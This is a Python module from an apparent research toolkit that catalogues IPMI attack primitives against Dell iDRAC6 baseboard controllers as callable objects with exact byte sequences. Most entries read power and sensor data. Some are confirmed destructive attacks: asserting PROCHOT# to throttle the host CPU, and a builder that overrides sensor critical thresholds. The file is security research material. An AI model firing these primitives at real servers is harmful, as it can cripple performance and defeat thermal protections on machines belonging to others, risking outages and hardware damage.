"""
zipmi.attacks.dell — Dell iDRAC6 attack primitives ingested from research.

Catalogues every IPMI byte sequence I've previously demonstrated on
Dell PowerEdge T710 / iDRAC6 1.70. Each AttackPrimitive is callable:
hand it an active `zipmi.core.Session` (with ZIPMI_ALLOW_WRITE acknowledged)
and it sends the documented bytes.

Confirmed dangerous primitives are gated by a `destructive=True` flag;
the .send() helper requires `force=True` to fire any of those.

REFS  /Volumes/yyy/phd/bmc/dell/dell-prochot-throttle-attack.md
      /Volumes/yyy/phd/bmc/dell/dell-oem-ipmi-attack-primitives.md
      /Volumes/yyy/phd/bmc/dell/dell-thermal-bios-attack.md
      /Volumes/yyy/phd/bmc/dell/dell-wsman-bios-attack.md
      /Volumes/yyy/phd/bmc/findings/003-dell-oem-power-commands.md
      /Volumes/yyy/phd/bmc/findings/005-sensor-threshold-tampering.md
      /Volumes/yyy/phd/bmc/findings/006-power-cap-attack.md
"""

from __future__ import annotations

from dataclasses import dataclass, field

from ..core import Session


@dataclass
class AttackPrimitive:
    name: str
    netfn: int
    cmd: int
    data: bytes
    description: str
    destructive: bool = False
    confirmed: bool = False
    refs: list[str] = field(default_factory=list)

    def send(self, session: Session, *, force: bool = False) -> tuple[int, bytes]:
        """Run the primitive against an active session.

        Returns (cc, response_body). Destructive primitives require force=True.
        """
        if self.destructive and not force:
            raise RuntimeError(
                f"{self.name!r} is destructive (description: {self.description}). "
                f"Pass force=True to fire."
            )
        return session.send_raw(self.netfn, self.cmd, self.data)


# -- PROCHOT throttle -----------------------------------------------------
# /Volumes/yyy/phd/bmc/dell/dell-prochot-throttle-attack.md
# DellCmdThrottleCPU @ NetFn 0x30 cmd 0xC0
#   subcmd 0x00 [1B] -> read PROCHOT state (7B response)
#   subcmd 0x01 <mode> -> set CPU throttle mode

PROCHOT_READ = AttackPrimitive(
    name="DellCmdThrottleCPU.read",
    netfn=0x30, cmd=0xC0, data=b"\x00",
    description="Read CPU throttle / PROCHOT# state",
    destructive=False, confirmed=True,
    refs=["dell-prochot-throttle-attack.md"],
)

PROCHOT_ASSERT = AttackPrimitive(
    name="DellCmdThrottleCPU.assert",
    netfn=0x30, cmd=0xC0, data=b"\x01\x01",
    description="Assert PROCHOT# — host CPU drops to base clock until released",
    destructive=True, confirmed=True,
    refs=["dell-prochot-throttle-attack.md"],
)

PROCHOT_RELEASE = AttackPrimitive(
    name="DellCmdThrottleCPU.release",
    netfn=0x30, cmd=0xC0, data=b"\x01\x00",
    description="Deassert PROCHOT# — restore CPU to normal turbo",
    destructive=False, confirmed=True,
    refs=["dell-prochot-throttle-attack.md"],
)


# -- PSU Redundancy / RIPS -----------------------------------------------
# DellCmdRIPSControl @ NetFn 0x30 cmd 0xC2
# Requires 3-byte payload; controls power supply redundancy via I2C to PSU.

RIPS_PROBE = AttackPrimitive(
    name="DellCmdRIPSControl.probe",
    netfn=0x30, cmd=0xC2, data=b"\x00\x00\x00",
    description="Probe PSU RIPS subcmd 0",
    destructive=False, confirmed=False,
    refs=["dell-oem-ipmi-attack-primitives.md"],
)


# -- LCD message override -------------------------------------------------
# DellCmdReadWriteLCD @ NetFn 0x30 cmd 0x1C
# Format requires reverse engineering DellCmdReadWriteLCD; placeholder.

LCD_DEMO_PAYLOAD = AttackPrimitive(
    name="DellCmdReadWriteLCD.demo",
    netfn=0x30, cmd=0x1C, data=b"\x01\x00\x00\x00",
    description="LCD write demo — payload format from RE pending",
    destructive=False, confirmed=False,
    refs=["dell-oem-ipmi-attack-primitives.md"],
)


# -- Power-supply read --------------------------------------------------
# /Volumes/yyy/phd/bmc/findings/003-dell-oem-power-commands.md
# `raw 0x30 0xb0 0x0a 0x01` -> `78 05 82 00 08 01 ba 5b 00 00 30 31 2e 30 31 ...`
# Probably DellCmdReadPSUInfo (PSU 1).

PSU_INFO_PSU1 = AttackPrimitive(
    name="DellCmdReadPSUInfo.psu1",
    netfn=0x30, cmd=0xB0, data=b"\x0a\x01",
    description="Read PSU1 info (rated W, present, model, FW rev)",
    destructive=False, confirmed=True,
    refs=["findings/003-dell-oem-power-commands.md"],
)

PSU_INFO_PSU2 = AttackPrimitive(
    name="DellCmdReadPSUInfo.psu2",
    netfn=0x30, cmd=0xB0, data=b"\x0a\x02",
    description="Read PSU2 info",
    destructive=False, confirmed=False,
    refs=["findings/003-dell-oem-power-commands.md"],
)

POWER_BUDGET = AttackPrimitive(
    name="DellCmdReadPowerBudget",
    netfn=0x30, cmd=0xB3, data=b"\x0a\x00",
    description="Read power budget / cap config",
    destructive=False, confirmed=True,
    refs=["findings/003-dell-oem-power-commands.md"],
)

POWER_HISTORY = AttackPrimitive(
    name="DellCmdReadPowerHistory",
    netfn=0x30, cmd=0x9C, data=b"\x07\x01",
    description="Read 1-week power consumption history",
    destructive=False, confirmed=True,
    refs=["findings/003-dell-oem-power-commands.md"],
)

POWER_BUDGET_BYTES = AttackPrimitive(
    name="DellCmdReadPowerBudgetBytes",
    netfn=0x30, cmd=0xBB, data=b"",
    description="Read 4-byte power budget config",
    destructive=False, confirmed=True,
    refs=["findings/003-dell-oem-power-commands.md"],
)


# -- Sensor threshold tampering -------------------------------------------
# /Volumes/yyy/phd/bmc/findings/005-sensor-threshold-tampering.md
# Uses STANDARD spec cmds (NetFn 0x04) — not Dell OEM:
#   raw 0x04 0x27 <sensor#>  -> Get Sensor Threshold
#   raw 0x04 0x26 <sensor#> <flags> <thresholds...>  -> Set Sensor Threshold
# Successfully altered sensor 0x0e thresholds on Dell.

THRESHOLD_GET_FAN_INTAKE = AttackPrimitive(
    name="GetSensorThreshold.fan_intake",
    netfn=0x04, cmd=0x27, data=b"\x0e",
    description="Read sensor 0x0e (fan intake) thresholds",
    destructive=False, confirmed=True,
    refs=["findings/005-sensor-threshold-tampering.md"],
)


def threshold_tamper(sensor: int, ucr: int, unr: int) -> AttackPrimitive:
    """Build a Set Sensor Threshold primitive that overrides UCR + UNR.

    flags byte 0x06 = "set upper-critical + upper-non-recoverable".
    """
    return AttackPrimitive(
        name=f"SetSensorThreshold.tamper_0x{sensor:02x}",
        netfn=0x04, cmd=0x26,
        data=bytes([sensor, 0x06, 0x00, 0x00, 0x00, ucr, unr]),
        description=f"Override sensor 0x{sensor:02x} UCR={ucr:#04x} UNR={unr:#04x}",
        destructive=True, confirmed=True,
        refs=["findings/005-sensor-threshold-tampering.md"],
    )


# -- iDRAC racadm extended config (CmdOEMExtendedConfigure) --------------
# /Volumes/yyy/phd/bmc/dell/dell-oem-ipmi-attack-primitives.md (cmd 0x1c/0x27)
# 4-byte payload: <group> <object_index_lo> <object_index_hi> <reserved>

def extended_config_get(group: int, idx: int = 0) -> AttackPrimitive:
    """CmdOEMExtendedConfigure read (cmd 0x27)."""
    return AttackPrimitive(
        name=f"CmdOEMExtendedConfigure.get_grp{group:02x}_idx{idx:04x}",
        netfn=0x30, cmd=0x27,
        data=bytes([group, idx & 0xFF, (idx >> 8) & 0xFF, 0x00]),
        description="racadm extended-configure read",
        destructive=False, confirmed=True,
        refs=["dell-oem-ipmi-attack-primitives.md"],
    )


# -- Catalog -------------------------------------------------------------

ATTACKS: dict[str, AttackPrimitive] = {
    p.name: p for p in [
        PROCHOT_READ, PROCHOT_ASSERT, PROCHOT_RELEASE,
        RIPS_PROBE, LCD_DEMO_PAYLOAD,
        PSU_INFO_PSU1, PSU_INFO_PSU2,
        POWER_BUDGET, POWER_HISTORY, POWER_BUDGET_BYTES,
        THRESHOLD_GET_FAN_INTAKE,
    ]
}


__all__ = [
    "AttackPrimitive", "ATTACKS",
    "PROCHOT_READ", "PROCHOT_ASSERT", "PROCHOT_RELEASE",
    "RIPS_PROBE", "LCD_DEMO_PAYLOAD",
    "PSU_INFO_PSU1", "PSU_INFO_PSU2",
    "POWER_BUDGET", "POWER_HISTORY", "POWER_BUDGET_BYTES",
    "THRESHOLD_GET_FAN_INTAKE",
    "threshold_tamper", "extended_config_get",
]
